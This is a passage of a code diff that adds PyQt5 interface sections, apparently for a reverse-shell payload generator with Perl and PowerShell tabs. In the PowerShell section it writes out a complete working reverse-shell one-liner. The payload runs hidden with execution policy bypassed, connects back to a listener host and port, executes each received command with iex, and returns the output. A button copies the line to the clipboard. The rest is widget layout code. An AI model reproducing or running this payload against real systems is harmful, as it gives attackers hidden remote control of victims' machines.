+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.perl_Scan1_Copy)
+        label_layout.addWidget(self.perl_Scan1)
+        self.tab6_container_layout.insertLayout(26, label_layout)
+        self.tab6_container_layout.addStretch()
+
+        # perl_divider 1
+        if hasattr(self, 'perl_divider1'):
+            self.tab6_container_layout.removeWidget(self.perl_divider1)
+            self.perl_divider1.deleteLater()
+        self.perl_divider1 = QFrame()
+        self.perl_divider1.setFrameShape(QFrame.HLine)
+        self.perl_divider1.setLineWidth(3)
+        self.perl_divider1.setStyleSheet("color: #20C20E;")
+        
+        # perl_divider2
+        if hasattr(self, 'perl_divider2'):
+            self.tab6_container_layout.removeWidget(self.perl_divider2)
+            self.perl_divider2.deleteLater()
+        self.perl_divider2 = QFrame()
+        self.perl_divider2.setFrameShape(QFrame.HLine)
+        self.perl_divider2.setLineWidth(3)
+        self.perl_divider2.setStyleSheet("color: #20C20E;")
+        
+        # perl_spacer1
+        if hasattr(self, 'perl_spacer1'):
+            self.tab6_container_layout.removeWidget(self.perl_spacer1)
+            self.perl_spacer1.deleteLater()
+        self.perl_spacer1 = QLabel()
+        self.perl_spacer1.setFixedWidth(40)
+        self.perl_spacer1.setFixedHeight(50)
+        
+        # perl_spacer2
+        if hasattr(self, 'perl_spacer2'):
+            self.tab6_container_layout.removeWidget(self.perl_spacer2)
+            self.perl_spacer2.deleteLater()
+        self.perl_spacer2 = QLabel()
+        self.perl_spacer2.setFixedWidth(40)
+        self.perl_spacer2.setFixedHeight(50)
+
+        # perl_spacer & divider layout
+        self.tab6_container_layout.insertWidget(27, self.perl_spacer1)
+        self.tab6_container_layout.insertWidget(28, self.perl_divider1)
+        self.tab6_container_layout.insertWidget(29, self.perl_divider2)
+        self.tab6_container_layout.insertWidget(30, self.perl_spacer2)
+        self.tab6_container_layout.addStretch()
+        
+# ps
+        if hasattr(self, 'ps'):
+            self.tab6_container_layout.removeWidget(self.ps)
+            self.ps.deleteLater()
+        self.ps = QLabel("[+ Powershell]")
+        self.ps.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab6_container_layout.insertWidget(31,self.ps)
+
+        # ps_Scan1
+        if hasattr(self, 'ps_Scan1'):
+            self.tab6_container_layout.removeWidget(self.ps_Scan1)
+            self.ps_Scan1.deleteLater()
+        self.ps_Scan1 = QLabel("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"" + self.lhost + "," + self.lport + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
+        self.ps_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+            )
+
+        # ps_Scan1 copy button
+        if hasattr(self, 'ps_Scan1_Copy'):
+            self.tab6_container_layout.removeWidget(self.ps_Scan1_Copy)
+            self.ps_Scan1_Copy.deleteLater()
+        self.ps_Scan1_Copy = QPushButton()
+        self.ps_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.ps_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.ps_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.ps_Scan1.text()))
+        self.ps_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # ps_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.ps_Scan1_Copy)
+        label_layout.addWidget(self.ps_Scan1)
+        self.tab6_container_layout.insertLayout(32, label_layout)
+        self.tab6_container_layout.addStretch()
+        
+        # ps_divider 1
+        if hasattr(self, 'ps_divider1'):
+            self.tab6_container_layout.removeWidget(self.ps_divider1)
+            self.ps_divider1.deleteLater()
+        self.ps_divider1 = QFrame()
+        self.ps_divider1.setFrameShape(QFrame.HLine)
+        self.ps_divider1.setLineWidth(3)
+        self.ps_divider1.setStyleSheet("color: #20C20E;")
+        
+        # ps_divider2
+        if hasattr(self, 'ps_divider2'):
+            self.tab6_container_layout.removeWidget(self.ps_divider2)
+            self.ps_divider2.deleteLater()
+        self.ps_divider2 = QFrame()
+        self.ps_divider2.setFrameShape(QFrame.HLine)
+        self.ps_divider2.setLineWidth(3)
+        self.ps_divider2.setStyleSheet("color: #20C20E;")
+        
+        # ps_spacer1
+        if hasattr(self, 'ps_spacer1'):
+            self.tab6_container_layout.removeWidget(self.ps_spacer1)
+            self.ps_spacer1.deleteLater()
+        self.ps_spacer1 = QLabel()
+        self.ps_spacer1.setFixedWidth(40)
+        self.ps_spacer1.setFixedHeight(50)
+        
+        # ps_spacer2
+        if hasattr(self, 'ps_spacer2'):
+            self.tab6_container_layout.removeWidget(self.ps_spacer2)
+            self.ps_spacer2.deleteLater()
+        self.ps_spacer2 = QLabel()
+        self.ps_spacer2.setFixedWidth(40)
+        self.ps_spacer2.setFixedHeight(50)
+
+        # ps_spacer & divider layout
+        self.tab6_container_layout.insertWidget(33, self.ps_spacer1)
+        self.tab6_container_layout.insertWidget(34, self.ps_divider1)
+        self.tab6_container_layout.insertWidget(35, self.ps_divider2)
+        self.tab6_container_layout.insertWidget(36, self.ps_spacer2)
+        self.tab6_container_layout.addStretch()
 
 if __name__ == '__main__':
     app = QApplication(sys.argv)
